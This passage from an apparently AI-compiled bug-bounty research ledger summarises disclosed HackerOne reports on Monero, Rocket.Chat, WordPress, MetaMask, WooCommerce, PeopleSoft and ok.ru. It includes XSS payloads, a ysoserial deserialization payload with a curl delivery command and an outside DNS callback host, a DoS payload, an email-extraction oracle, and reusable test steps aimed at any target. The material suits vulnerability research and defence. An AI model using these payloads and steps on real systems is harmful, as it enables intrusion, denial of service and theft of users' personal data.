DEDUPE/DELTA: `263226`/`onbeforescriptexecute`/`media_url`-as-XSS = 0 technique hits; DELTA over §17.248/§17.257 (unlisted-event-handler family) = the TAG-NAME axis + the descendant-swallowing trigger. NO §17 slot. FRESHNESS: 2017-08/2017-09 — OUTSIDE the window (~9 years), read because assigned; `onbeforescriptexecute` is Gecko-only.

SOURCE: https://hackerone.com/reports/3619409  2026-11-12
STATUS: UNVERIFIED (not reproduced). CLASS: installer-granted world-writable EXECUTABLE directory -> binary planting -> cross-user local code execution / privilege escalation. Monero, reporter `qttps`, submitted 2026-03-21, disclosed 2026-08-20, high; live `.json` `visibility: full`, VI 5,249 chars read IN FULL.
CORE METHOD: (1) Inno Setup `installers/windows/Monero.iss:59`: `Name: "{app}\p2pool"; Permissions: users-full` — `%ProgramFiles%\Monero GUI Wallet\p2pool` is user-writable. (2) The GUI "later trusts and executes `p2pool.exe` from that directory" — `P2PoolManager.cpp:124-129` (`isInstalled()` = existence-only), `:154-210` (`start()` executes it). (3) STR: `icacls "%ProgramFiles%\Monero GUI Wallet\p2pool"` confirms write; low-priv user plants a benign PoC `p2pool.exe`; victim starts P2Pool from the GUI -> "the planted `p2pool.exe` is executed instead of a trusted bundled binary". (4) Impact verbatim: "cross-user local code execution", "persistence in a trusted application path", "possible privilege escalation if a higher-privileged user later runs Monero GUI".
DETECTION SIGNAL: installer ACL grant (Inno Setup `Permissions: users-full`/`users-modify`, MSI `Permission` tables, NSIS `AccessControl`) on an install-tree directory holding an exe the app later runs; existence-only install checks. Distinguish from DLL-search-order (§17.343/#440963): the binary EXISTS and is REPLACED.
CHAIN: low-priv local user -> user-writable exe dir (installer's own ACL directive) -> plant `p2pool.exe` -> trusted app executes it in the victim's (possibly admin) context -> cross-user code execution / privesc (High).
TRANSFERABLE TEST: walk the install tree with `icacls … /T` flagging Users-writable dirs containing exes; grep installer sources for `Permissions:`/Permission tables; replace the exe with a marker PoC and trigger the feature. Rule: **an installer ACL granting user-write on an executable directory converts a trusted Program Files path into a code-execution surface.**
DEDUPE/DELTA: `3619409`/`qttps`/`p2pool`/`users-full`/`Inno Setup`/`binary plant` = 0 hits; distinct from §17.182 (helper RPC), §17.343 (traversal->DLL), #440963 (missing-dir probe). NEW -> §17.628. FRESHNESS: 2026-03/2026-08 — INSIDE the window.

SOURCE: https://hackerone.com/reports/3601469  2026-11-12
STATUS: UNVERIFIED (not reproduced). CLASS: auth bypass by RPC-TRANSPORT PARITY GAP — restricted-mode policy enforced on HTTP RPC not propagated to the parallel ZMQ JSON-RPC surface. Monero, reporter `usagirabbit`, submitted 2026-03-12, disclosed 2026-08-17, high; live `.json` `visibility: full`, VI 17,494 chars read IN FULL (PoC + patch).
CORE METHOD: (1) Contract: `--restricted-rpc`/`--public-node` = "restricted RPC mode, view-only commands". (2) HTTP gates admin methods behind `!m_restricted` (`MAP_URI_AUTO_JON2_IF("/start_mining", …, !m_restricted)` etc.). (3) The ZMQ handler is built WITHOUT the flag (`zmq_internals(t_core& core, t_p2p& p2p) : rpc_handler{core.get(), p2p.get()}`) and `daemon_handler.cpp:80/941` dispatches `start_mining`/`stop_mining`/`save_bc`/`set_log_level`/`mining_status`/`get_peer_list` unconditionally — "There was no restricted-mode denial between request parsing and handler dispatch." (4) PoC: `monerod --restricted-rpc … --zmq-rpc-bind-ip 0.0.0.0 --zmq-rpc-bind-port 18082`; `pyzmq` REQ `{"jsonrpc":"2.0","id":1,"method":"set_log_level","params":{"rpc_version":131072,"level":4}}` -> `{"result":{…,"status":"OK"}}` vulnerable vs `"set_log_level" is not available in restricted mode.` patched; `start_mining` with attacker `miner_address` + `threads_count` = CPU theft. ZMQ also "lacks the HTTP-side external-bind confirmation gate".
DETECTION SIGNAL: one API over MULTIPLE transports (HTTP + ZMQ/gRPC/WS/unix socket) where the security mode is enforced on ONE dispatch path only; differential tell = same method denies on transport A, returns OK on transport B.
CHAIN: restricted node with ZMQ beyond loopback (no `--confirm-external-bind` on ZMQ) -> unauthenticated ZMQ call to a restricted method -> `start_mining` attacker-address mining / `save_bc` / `set_log_level` -> unauthenticated remote admin actions on a "restricted" node (High, CVSS 8.1).
TRANSFERABLE TEST: enumerate every transport speaking the same RPC; call the full admin-method set on each under restricted/no auth; any method succeeding on a sibling transport where the primary denies = the bypass. Rule: **a security mode is only as strong as its least-enforced transport — diff admin-method access across every transport.**
DEDUPE/DELTA: `3601469`/`zmq_internals`/`daemon_handler`/`zmq-rpc` = 0; distinct from §17.448 (#3620006 per-handler deny-list holes in ONE transport; here the mode STATE never reaches a SECOND transport) and batch-152 #3738727 (redaction hole). NEW -> §17.629. FRESHNESS: 2026-03/2026-08 — INSIDE the window.

SOURCE: https://hackerone.com/reports/3589551  2026-11-12
STATUS: UNVERIFIED (not reproduced). CLASS: RBAC fail-open via PERMISSION-METADATA KEY TYPO. Rocket.Chat, reporter `arccode`, submitted 2026-03-06, disclosed 2026-04-23, medium 6.5, CVE-2026-29197; researcher body withheld (`visibility: no-content`, VI 0) — team summary read live, MECHANISM read from the credited fix PR RocketChat/Rocket.Chat#40125 `.diff` (2,027 B, read IN FULL).
CORE METHOD: (1) Fix diff verbatim: `api.addRoute('logs', { authRequired: true, permissionRequired: ['manage-apps'], validateParams: isAppLogsProps }, …)` — the framework reads `permissionsRequired` (plural); the fix renames the key in `appGeneralLogsHandler.ts` (`GET /api/apps/logs`) and `appLogsHandler.ts` (`GET /api/apps/:id/logs`). (2) `authRequired: true` (different key) holds, but the typo'd permission key never reaches the RBAC check (team summary: "A typo in the permissions mechanism … allows any authenticated user to retrieve information via GET requests"). (3) Exploit: any authenticated non-admin `GET /api/apps/logs` + `/api/apps/<id>/logs` -> admin-only apps-engine logs. (4) "Affects versions <8.4.0, <8.3.2, <8.2.2, <8.1.3, <8.0.4, <7.13.6, <7.12.7, <7.11.7, and <7.10.10."
DETECTION SIGNAL: authz declared as METADATA (route options, decorators, YAML) with enforcement reading a named key — grep for BOTH spellings and for options SET but never READ; black-box: admin-only endpoint answering 200 to a low-priv GET.
CHAIN: low-priv authenticated account -> `GET /api/apps/logs` (permission gate silently never runs) -> admin-only Enterprise log data (medium 6.5, CVE-2026-29197).
TRANSFERABLE TEST: diff key names routes SET vs middleware READS (singular/plural, camelCase, `Required` suffix); black-box GET every admin endpoint as a minimal user; read one route's fix diff to find siblings. Rule: **permission metadata the enforcement layer does not recognise fails OPEN, not closed — audit the key SPELLING.**
DEDUPE/DELTA: `3589551`/`permissionRequired`/`permissionsRequired`/`addRoute`/`apps/logs`/`CVE-2026-29197` = 0; `fail-open` hits = §17.212/V-07 (different layers); distinct from §17.448 (enforcement incomplete vs never bound). NEW -> §17.630. FRESHNESS: 2026-03/2026-04 — INSIDE the window.

SOURCE: https://hackerone.com/reports/2997549  2026-11-12
ROUTE: live `https://hackerone.com/reports/2997549.json` = HTTP 200 but `visibility: no-content`, `vulnerability_information` 0 B (reporter body withheld). Title + Autodesk team summary read via `web_extract` of the live page this pass. THE ROUTE THAT WORKED FOR THE MECHANISM: the credited public writeups — NVD CVE-2023-5561 ("WordPress does not properly restrict which user fields are searchable via the REST API, allowing unauthenticated attackers to discern the email addresses of users who have published public posts on an affected website via an Oracle style attack", CVSS 3.1 5.3 `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`) and the projectdiscovery nuclei template `http/cves/2023/CVE-2023-5561.yaml` (author `nqdung2002`, `metadata.verified: true`), both read via web search this pass. (The Wordfence threat-intel page returned SOURCE_NOT_AVAILABLE this pass and is NOT cited as read.) Metadata: Autodesk, "CVE-2023-5561 on Payapps.com", reporter `khoof`, submitted 2025-02-17, disclosed 2025-03-05, weakness Information Disclosure, severity medium 5.3, resolved (retested and accepted 2025-02-26). Team summary, verbatim: "A vulnerability was identified at the WordPress site on `payapps.com`. This vulnerability allowed unauthenticated attackers to discern the email addresses of users who have published public posts. Autodesk has fixed the vulnerability and we thank @khoof reporting this issue."
STATUS: UNVERIFIED (not reproduced — no WordPress instance was stood up and no request was sent to payapps.com this pass; every request shape and quote below is verbatim from the fetched report metadata/summary or the cited public writeups).
CLASS: sensitive information disclosure with PoC — REST-API SEARCH-COLUMN ORACLE: the user-search parameter silently filters on a column the response schema never shows (`user_email`), so match/no-match of the returned rows is an unauthenticated presence oracle for the hidden column (CWE-200).
CORE METHOD:
  1. THE ENTRY (nuclei template verbatim shape): `GET /wp-json/wp/v2/users?search=<candidate>` and the pathless twin `GET /?rest_route=/wp/v2/users&search=<candidate>` (template `path: "{{BaseURL}}/{{route}}search=@"` with `route` payloads `wp-json/wp/v2/users?` and `?rest_route=/wp/v2/users&`, `attack: clusterbomb`, `stop-at-first-match: true`), unauthenticated.
  2. THE BUG (nuclei description verbatim): "While the search results do not display user email addresses unless the requesting user has the 'list_users' capability, the search is applied to the user_email column." The REST response rows show only `id`/`name`/`slug`, but the `search` filter runs LIKE-style against `user_email` anyway.
  3. THE ORACLE: rows present (`200`, `application/json`, body matching `contains_all(body, "[{\"id\", \"name\":")` per the template's matcher) = the candidate string matches a hidden email; empty array = no match. The template's own detector queries `search=@` — a value only an e-mail address can contain — so returning rows proves the hidden column is inside the search index.
  4. THE EXTRACTION (NVD verbatim: "via an Oracle style attack"; SentinelOne verbatim: "iteratively testing character combinations and analyzing the differential responses, an attacker can reconstruct email addresses character-by-character") — grow a candidate one character at a time (`a-z0-9._%+-@`), each request answering match/no-match for `search=<prefix-so-far><guess>`.
  5. SCOPE (nuclei verbatim: "versions between 4.7.0 and 6.3.1"; NVD lists backports 6.2.3/6.1.4/6.0.6/5.9.8, fixed 6.3.2): only users who have PUBLISHED PUBLIC POSTS sit in the user index and are recoverable.
DETECTION SIGNAL: a list/search endpoint whose `search`/`filter` parameter matches a field absent from every returned row (email, phone, national id); the tell: `search=<a value only that hidden field can contain>` returns rows although the field is displayed nowhere in the response schema. On WordPress: version < 6.3.2 and unauthenticated `GET /wp-json/wp/v2/users?search=@` returning `[{"id","name":`.
CHAIN: unauthenticated caller (primitive: the REST user route is public by default) -> `search=<candidate>` requests (primitive: the filter silently queries the response-hidden `user_email` column) -> match/no-match rows oracle -> character-by-character reconstruction of every public-post author's e-mail (impact: unauthenticated PII disclosure of all post authors; CVE/program rated Medium 5.3 `C:L/I:N/A:N`; H1 triage set medium 5.3) -> documented follow-on per §10.3's recorded lesson ("enumeration endpoints are severity-elastic"): harvested e-mails feed phishing / credential-stuffing / password-spray -> ATO precursor. Doctrine note: standalone this is medium info-disclosure with PoC; it becomes a reportable chain only where the harvested e-mails demonstrably reach account impact.
TRANSFERABLE TEST: on any WordPress 4.7.0–6.3.1 (or any API with a user/object search): (1) `GET /wp-json/wp/v2/users?search=@` (and `?rest_route=/wp/v2/users&search=@`) unauthenticated — rows returning while no row shows an e-mail proves the hidden-column index; (2) run the oracle: per author, brute `search=<prefix+guess>` char-by-character, keeping prefixes that return rows until the full address reconstructs; (3) generalise beyond WP: for EVERY search/filter parameter, submit a value only a hidden field can contain (an `@` for an e-mail, a known private string) and watch whether result presence changes. Rule: **a search that filters on columns the response hides is a presence oracle for those columns — audit the searchable column set, not the returned field set.**
DEDUPE/DELTA: `2997549`, `khoof`, `Payapps`, `payapps`, `CVE-2023-5561`, `user_email`, `search oracle`, `oracle-style` = 0 technique hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: §17.442 (#2213251 — a search/COUNT endpoint returning `total_count` over non-public CONTENT is a boolean oracle and a PREFIX WILDCARD makes it a char-by-char extractor; same oracle lesson but the hidden data there is document text behind a count field and extraction needs the query language's `*` — the DELTA recorded here is the HIDDEN-COLUMN facet: the filter itself queries `user_email` while the schema hides it, the oracle is ROW PRESENCE not a count, and no wildcard is needed because the substring match answers every candidate directly, plus the concrete WP instance/test); §10.3 (the SAME `/wp/v2/users/` family but the LIST route exposing public author fields — an enumeration/authorization gap, not a search-column oracle); #125505 / §17.102 (one-time-secret validity deltas + keyspace reduction — a code oracle, different target); the ledger's Valve short-numeric-code no-entry note (~5476) and §3.1 identifier-swap-and-enumerate (generic IDOR enumeration). DELTA entry, NO §17 slot (the general method family already owns §17.442).
FRESHNESS: the H1 report was disclosed 2025-03-05 (~20 months before this read — OUTSIDE the preferred 6-12 month window; read because assigned) and the underlying CVE dates to 2023-10 (~3 years): the technique is version-gated (WordPress fixed in 6.3.2 with backports). Against unpatched/legacy WordPress the test is still live; treat modern instances as presumed patched and verify with the `search=@` detector rather than assuming.

SOURCE: https://hackerone.com/reports/1768166  2026-11-12
ROUTE: live `https://hackerone.com/reports/1768166.json` = HTTP 200 but `visibility: no-content`, `vulnerability_information` 0 B (reporter body withheld on every mirror). THE ROUTE THAT WORKED: `web_extract` on the live page = the public "Summary by MetaMask", read IN FULL this pass. Web search this pass found only mirrors of that same summary (ajaysenr/HackerOne-Disclosed-Reports index row, cybershafarat PDF report list) — no independent credited writeup and no reporter body exists publicly. Metadata: MetaMask, "Arbitrary file write triggered by deeplink abuse - MetaMask Android", reporters `hackerontwowheels` + `renekroka` (UGWST / Talaria Security Labs), submitted 2022-11-09, disclosed 2023-07-07, weakness Business Logic Errors, severity medium (triaged Critical 9.6 -> medium 4.3 -> none -> medium), bounty paid, resolved.
STATUS: UNVERIFIED (not reproduced — no Android device and no MetaMask build was driven this pass; every mechanism claim below is quoted from MetaMask's public summary).
CLASS: business logic / client-side arbitrary file write — a DEEPLINK THAT LANDS THE USER IN THE IN-APP BROWSER TRIGGERS AN IMMEDIATE, UNCONFIRMED DOWNLOAD OF ATTACKER-SUPPLIED CONTENT, so one click writes an attacker-chosen file to the device (the write primitive is the missing consent, not a path bug).
CORE METHOD:
  1. THE TRIGGER (summary verbatim): "attackers can deeplink into MetaMask's in-app browser, and trigger the immediate download of an attacker supplied file" — the deeplink is an ordinary link, plantable anywhere (page, message, email, QR), so the write is one click and remotely staged.
  2. THE DEFECT (summary verbatim): "Due to a lack of confirmation prompts, users are not made aware that a download has occurred until after the payload has been downloaded" — no user gesture beyond opening the link; the in-app browser's download path persists the fetched bytes.
  3. THE PRIMITIVE (summary verbatim): "a vulnerability in the MetaMask Android app that allows for arbitrary files to be written to disk" — file CONTENT is attacker-hosted (a `Content-Disposition: attachment`-style response drives the save), so content and (via the response) name are attacker-chosen.
  4. RATING CONTEXT: triaged Critical 9.6 -> medium 4.3 -> none -> medium — the standalone write is a staging primitive; MetaMask's own framing is "arbitrary file write", and the primitive's power is in the chain (below).
DETECTION SIGNAL: an Android app that (a) registers a deeplink/intent filter which lands the user in an IN-APP BROWSER/WebView on an attacker URL, and (b) has a download handler that saves fetched bytes to disk with NO confirmation dialog and no explicit user gesture; plus download handlers honouring `Content-Disposition` from a fully attacker-controlled response. Distinguish from #1378889 (Slack Android: a SHARED FILE opened in a workspace, auto-download only above a SIZE threshold, server-supplied traversal NAME -> app-private config overwrite): here the TRIGGER is the deeplink itself, the download fires immediately, and no workspace/upload is involved.
CHAIN: attacker plants a one-click deeplink anywhere a link is clickable (primitive: deeplinks are externally reachable) -> victim taps -> the in-app browser opens the attacker URL and immediately downloads the payload to disk with no confirmation (primitive: unconsented write of attacker-chosen content; the victim is unaware until after the fact) -> escalation A: combine with any filename/path gadget (the Basecamp deeplink `filename` param family §17.363 / #2553411, the Slack server-supplied-name traversal #1378889) to aim the write at a file the app or a sibling app trusts — config/prefs/asset overwrite -> auth-token/seed disclosure or code execution (the P2); escalation B: silent staging of payloads (APK, import/config files) into shared storage for auto-load or social-engineering chains. As filed: arbitrary file write on the device, program Medium (initially triaged 9.6).
TRANSFERABLE TEST: on every Android app with a deeplink handler + in-app browser: (1) fire the deeplink at the browser with `adb shell am start -a android.intent.action.VIEW -d '<deeplink> https://attacker/payload'` (or tap a crafted link); (2) serve `payload` with `Content-Disposition: attachment; filename="<name>"` and confirm a file lands on disk with NO confirmation prompt and the attacker-chosen name; (3) separately test path control (`../` in the filename, deeplink query params such as `filename=`) and whether any trusted file can be overwritten; (4) record whether ANY UI appears before the write. Rule: **a deeplink that lands in a downloading in-app browser is a remote file-write trigger — ask two separate questions: "is there a confirmation?" and "who names the path?"**
DEDUPE/DELTA: `1768166`, `hackerontwowheels`, `renekroka`, `UGWST`, "confirmation prompt" (as a download gate), `Content-Disposition` (as a write driver) = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: #1378889 / Slack Android (server-supplied NAME traversal + size-gated auto-download of a workspace-shared file -> app-private config overwrite; recorded with its own delta), §17.363 / #2553411 Basecamp (a deeplink QUERY PARAM naming the save path -> traversal into shared storage — there the defect is path control; here there is no path parameter: the UNCONFIRMED DOWNLOAD ITSELF is the primitive), §17.376 / #1941767 (the SAME app surface — MetaMask Mobile's in-app browser — but a different defect: dropping the site's CSP, XSS-defense class), §17.72 / #2995025 (deeplink bearer-token theft — data theft, not a write). NEW: the deeplink -> in-app browser -> unconfirmed-download axis as a REMOTE WRITE TRIGGER. New general method -> §17.631.
FRESHNESS: submitted 2022-11-09 / disclosed 2023-07-07 — OUTSIDE the preferred 6-12 month window (~3.4 years before this read; read because assigned), caveat carried; the defect class (in-app-browser download without consent) is app-design-level, not version-gated.

SOURCE: https://hackerone.com/reports/530499  2026-11-12
ROUTE: live `https://hackerone.com/reports/530499.json` = HTTP 200, `visibility: full`, `vulnerability_information` 1,903 chars read IN FULL. Metadata: Automattic, "WooCommerce: Persistent XSS via customer address (state/county)", reporter `foobar7` (verified), submitted 2019-04-07, disclosed 2019-05-26, weakness Cross-site Scripting (XSS) - Stored, severity high (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N = 7.2), resolved, bounty paid, 40 votes.
STATUS: UNVERIFIED (not reproduced — no WordPress/WooCommerce instance was stood up this pass; every step and quote below is verbatim from the fetched report body).
CLASS: stored XSS in the ADMIN user-detail surface via a CUSTOMER-controlled address field -> JavaScript in the WordPress administrator's session -> RCE (PHP write via the plugin/theme editor) — CWE-79 -> CWE-94.
CORE METHOD:
  1. THE DEFECT (report verbatim): "The current version (3.5.7) of the WooCommerce WordPress plugin echoes the state/county of a customer in the admin backend without encoding, leading to persistent XSS." The attacker needs only a customer account: "For a successful attack, an attacker needs a customer account, though it is to be expected that account creation is available for users in a considerable amount of setups."
  2. THE WRITE (report verbatim): "Login as a customer at http://192.168.0.101/wordpress/my-account/ ... add an item to cart & proceed to checkout. Under 'Billing Details', select UK as country and enter `'\"><img src=x onerror=alert(1) x=y` as `County` (note the missing `>` which is required as tags are filtered). Alternatively, simply change the address under account settings at `http://192.168.0.101/wordpress/my-account/edit-address/`."
  3. THE FILTER EVASION (report verbatim): the payload deliberately OMITS the closing `>` — "note the missing `>` which is required as tags are filtered" — i.e. the sanitizer strips COMPLETE tags (`<...>`) and an INCOMPLETE tag survives it; the browser's HTML parser still consumes the following markup until it finds a `>`, so `<img src=x onerror=alert(1) x=y` is parsed as a tag and the handler fires.
  4. THE SINK (report verbatim): "Go to `http://192.168.0.101/wordpress/wp-admin/users.php` and click on the customer, or directly visit `http://192.168.0.101/wordpress/wp-admin/user-edit.php?user_id=4`, where `4` is the customers ID." — the admin user-detail route renders the customer's state/county unencoded.
  5. THE ESCALATION (report verbatim): "If the victim is an administrator on a default WordPress setup, an attacker can exploit the issue to gain code execution on the server by eg sending a request to edit a WordPress plugin file." Impact verbatim: "With a successful attack, an attacker can read data available to the attacked user or perform arbitrary request in the name of the attacked user. With a default setup, an attacker can gain code execution on the server by eg editing a WordPress plugin file."
DETECTION SIGNAL: any shop/CRM where a LOW-PRIVILEGE customer can set a free-text address/profile field (County/State, Address, Company, VAT) and the same value is rendered in an ADMIN-ONLY user-detail route (`wp-admin/user-edit.php?user_id=<n>`, `/admin/users/<id>`, `/manage/customers/<id>`); a sanitizer that strips COMPLETE tags but not incomplete ones (the tell is a payload that only works when the `>` is omitted); the admin user-detail page is the sink, not the customer's own profile.
CHAIN: a customer registers (primitive: open registration) -> sets the County/state field to an incomplete-tag payload (primitive: stored injection into a customer-controlled field, evading the complete-tag filter) -> an administrator opens that customer's profile in wp-admin (primitive: the admin user-detail route renders the field unencoded) -> the payload executes in the ADMIN's session (escalation: privilege escalation into the admin context) -> the admin session calls the plugin/theme editor to write PHP (escalation: code execution) -> server compromise (final: RCE; program rated High 7.2). Per doctrine §8: precondition = a customer account (open registration) and an administrator who opens the customer's profile; gain = JavaScript in the administrator's WordPress session -> PHP write via the plugin/theme editor -> server RCE.
TRANSFERABLE TEST: on any shop/CRM/profile system — (1) register a low-priv customer account; (2) put `'\"><img src=x onerror=alert(1) x=y` (NO closing `>`) into EVERY free-text address/profile field, especially County/State/Address/Company; (3) open the ADMIN user-detail page for that customer (`wp-admin/user-edit.php?user_id=<n>` or the platform's equivalent) as an administrator and check whether the payload executes; (4) if it does, the chain is admin session -> plugin/theme editor -> RCE. Rule: **a customer-set address field rendered in the admin user-detail page is a stored-XSS->RCE chain — and a sanitizer that strips complete tags is evaded by omitting the closing `>`.**
DEDUPE/DELTA: `530499`, `foobar7`, `state/county`, `County`, `edit-address`, `user-edit.php`, `missing >` = 0 technique hits across the three write targets. Related-but-recorded REVIEWED and NOT re-recorded: §17.366 (#1122513 devicelock — an ADMIN-NAMED profile-EDIT path reachable by an ordinary account, with the PUBLIC profile page as the sink; its test step 4 says "also open the field's own value in the ADMIN's user-list view" — the DELTA here is the sink is the admin user-EDIT page, the source is the customer's OWN address field with no admin-path BAC needed, and the missing-`>` filter evasion); §1.1 / #126099 / #127948 (admin-notice/banner/log stored XSS -> plugin/theme editor RCE — the CHAIN endpoint is recorded; the DELTA here is the ENTRY POINT: a customer-controlled address field, not request metadata); §17.451 (#1086206 Acronis WooCommerce checkout — the SAME WooCommerce surface but a free-text `address` field reaching a payment gateway = blind SSRF, not XSS). NEW: the customer-address-field -> admin-user-edit-page sink + the incomplete-tag filter evasion. New general method -> §17.635.
FRESHNESS: submitted 2019-04-07 / disclosed 2019-05-26 — OUTSIDE the preferred 6-12 month window (~7.5 years before this read); read because assigned; the class (a customer profile field rendered in an admin detail page) is app-design-level and re-detectable on any shop/CRM.

SOURCE: https://hackerone.com/reports/329376  2026-11-12
ROUTE: ASSIGNED SOURCE https://hackerone.com/reports/329572 (Sony, "Remote Code Execution (RCE) in a Sony WebSystem", reporter `joaomatosf`, submitted 2018-03-24, disclosed 2019-01-23, weakness Deserialization of Untrusted Data, Critical 10.0) is `visibility: no-content`, `vulnerability_information` 0 B, team summary "⠀" (empty) — the reporter body is withheld on every route (live `.json` HTTP 200 with VI 0 B; the ajaysenr mirror prints "No vulnerability information available."; the Wayback captures are the JS-disabled SPA shell; no public writeup found). THE ROUTE THAT WORKED for the technique: the SAME CREDITED REPORTER's sibling report https://hackerone.com/reports/329376 (U.S. Dept Of Defense, "Remote Code Execution (RCE) in a DoD website", reporter `joaomatosf`, same weakness Deserialization of Untrusted Data, same Critical 10.0, same disclosure date 2019-01-23) — live `.json` HTTP 200, `visibility: full`, `vulnerability_information` 3,795 chars read IN FULL. The sibling documents the same technique family (Oracle PeopleSoft "monitor" service Java deserialization); the Sony-specific request shape is not public.
STATUS: UNVERIFIED (not reproduced — no PeopleSoft target was touched this pass; every command and quote below is verbatim from the fetched sibling report body).
CLASS: insecure deserialization (Java Object Deserialization, CWE-502) in an UNAUTHENTICATED Oracle PeopleSoft "monitor" service endpoint -> Remote Code Execution (and DoS) — CWE-502.
CORE METHOD:
  1. THE PLATFORM (report verbatim): "The DoD **`https://██████/psc/EXPROD_1/`** Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the 'monitor' service." — the endpoint is `/monitor/<environment>` under the PeopleSoft PIA (`/psc/<portal>/`).
  2. THE DEFECT (report verbatim): "an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366."
  3. THE PAYLOAD (report verbatim): "for generate the payload I used the tool ysoserial" — `git clone https://github.com/frohoff/ysoserial.git && cd ysoserial && mvn clean package –DskipTests && cd target && java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://testing1.jexboss.info > payload`.
  4. THE DELIVERY (report verbatim): `curl https://█████████/monitor/EXPROD_1 --data-binary @payload -k` — a raw POST of the serialized object to the monitor endpoint, NO authentication.
  5. THE OOB ORACLE (report verbatim): "if the code is executed successfully by the DoD server I will receive a DNS query from DoD and see it in the logs of my BIND daemon" — the URLDNS gadget forces a DNS lookup for an attacker-controlled name; the BIND log line `23-Mar-2018 18:51:09.183 queries: info: client █████████#53133: query: testing1.jexboss.info IN A -ED (10.0.1.202)` is the PoC.
  6. THE DoS VARIANT (report verbatim): a base64-encoded serialized `rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1...` payload (`echo -n "..." | base64 -d > payload_dos`) makes the service throw `java.lang.OutOfMemoryError: Java heap space` — "This will make your service stop immediately".
DETECTION SIGNAL: an Oracle PeopleSoft PIA host (`/psc/<portal>/<env>/`) exposing a `/monitor/<env>` endpoint that answers a raw POST (often with a Java deserialization error or a 500) — the tell is the path `/monitor/` plus a PeopleSoft footprint (`/psc/`, `psft`, `PeopleSoft`); any unauthenticated endpoint that reflects a Java deserialization exception (`java.io.InvalidClassException`, `ClassNotFoundException`, `ObjectInputStream`); an OOB DNS callback after posting a ysoserial URLDNS payload.
CHAIN: unauthenticated attacker -> POST a ysoserial serialized object to the PeopleSoft `/monitor/<env>` endpoint (primitive: the endpoint deserializes with `readObject()` and no type validation) -> the gadget executes in the app-server JVM (escalation: code execution) -> command execution / OOB DNS proof (final: RCE; program rated Critical 10.0). The same primitive yields DoS (OutOfMemoryError) without any gadget.
TRANSFERABLE TEST: on any PeopleSoft target — (1) fingerprint the PIA (`/psc/<portal>/<env>/`, `PeopleSoft`, `psft`); (2) probe `/monitor/<env>` with a raw POST of a ysoserial `URLDNS` payload (`java -jar ysoserial-all.jar URLDNS http://<your-oob-host> > payload; curl -k https://<target>/monitor/<env> --data-binary @payload`) and watch your OOB listener / BIND log for the lookup; (3) a DNS callback proves code execution in the JVM; (4) escalate with a CommonsCollections gadget for a shell. Rule: **an unauthenticated `/monitor/` endpoint on an Oracle PeopleSoft PIA is a Java-deserialization RCE — post a ysoserial URLDNS payload and let the OOB DNS callback be the PoC.**
DEDUPE/DELTA: `329376`, `PeopleSoft`, `PeopleTools`, `/psc/`, `EXPROD`, `jexboss`, `URLDNS`, `CVE-2017-10366` = 0 technique hits across the three write targets (the `ysoserial` hits are the generic tool lists at Bugbountyskills ~8178/8376/16099/21375 — not this endpoint; the `jexboss` hits are unrelated tool READMEs). Related-but-distinct REVIEWED and NOT re-recorded: §17.614 (#153026 Starbucks — Java deserialization RCE via the JBoss `JMXInvokerServlet`/`EJBInvokerServlet`, with a blind-execution oracle from a failed-launch error; the DELTA here is the ENDPOINT: Oracle PeopleSoft `/monitor/<env>`, CVE-2017-10366, and the OOB URLDNS PoC); §17.438 (#876708 DNN — a .NET BinaryFormatter cookie, not Java); §17.10 (GitLab Ruby Marshal). NEW: the PeopleSoft `/monitor/` endpoint + the URLDNS OOB PoC shape. New general method -> §17.636.
FRESHNESS: submitted 2018-03-24 / disclosed 2019-01-23 — OUTSIDE the preferred 6-12 month window (~8 years before this read); read because assigned (as the credited reporter's sibling of the assigned Sony report); the class (an unauthenticated Java-deserialization endpoint) is version-gated only by the PeopleSoft release, and the `/monitor/` path is re-detectable on any PeopleSoft footprint.

SOURCE: https://hackerone.com/reports/302253  2026-11-12
ROUTE: live `https://hackerone.com/reports/302253.json` = HTTP 200, `visibility: full`, `vulnerability_information` 518 chars read IN FULL (Russian). Metadata: ok.ru, "Очень жесткая XSS в личных сообщениях m.ok.ru", reporter `circuit` (unverified), submitted 2018-01-03, disclosed 2018-06-30, weakness Cross-site Scripting (XSS) - Stored, severity critical, resolved, bounty paid, 40 votes.
STATUS: UNVERIFIED (not reproduced — no ok.ru account was created and no request was sent to ok.ru this pass; every step and quote below is verbatim from the fetched report body, translated from Russian).
CLASS: stored XSS in a PRIVATE-MESSAGE dialog via a user-controlled MARKETPLACE LISTING TITLE — the listing name is reflected UNESCAPED into the "contact seller" dialog topic, so a seller's listing title executes in the BUYER's m.ok.ru session — CWE-79.
CORE METHOD:
  1. THE ENTRY POINT (report verbatim, translated): "Нашел багу в личных сообщениях в мобильной версии" — the bug is in private messages in the mobile version. The listing lives in a group market: "Переходим в группу https://m.ok.ru/group/54904397693159/market" (open the group's market).
  2. THE CARRIER (report verbatim, translated): "Ищем товар единственный на страничке" — find the only product on the page. The product TITLE is the attacker-controlled string.
  3. THE TRIGGER (report verbatim, translated): "Переходим на него и нажимаем на кнопку 'Связаться с продавцом'" — open the product and click "Contact seller"; "Видим алерт" — the alert fires.
  4. THE SINK (report verbatim): "Нет фильтрации служебных символов тут - `<div class=\"discus_dialogs_topic emphased tx-ellip\">\"&gt;<img src=\"x\" onerror=\"alert()\"></div>`" — the listing title is rendered into the private-message dialog's topic element (`div.discus_dialogs_topic`) with NO filtering of special characters; the `"` and `>` survive, so `<img src=x onerror=alert()>` executes.
  5. THE IMPACT (report verbatim): "## Impact\n\nXSS." — the program rated it Critical.
DETECTION SIGNAL: any marketplace/classifieds/group-market where a user-controlled LISTING TITLE (or product/group name) is rendered into a messaging UI — a "contact seller" / "message seller" / "ask a question" dialog, an order chat, a support-ticket subject; the tell is a dialog-topic element (`div.discus_dialogs_topic`, `.dialog__title`, `[class*=topic]`) whose text is the listing title and whose HTML is built by string concatenation rather than text-node assignment.
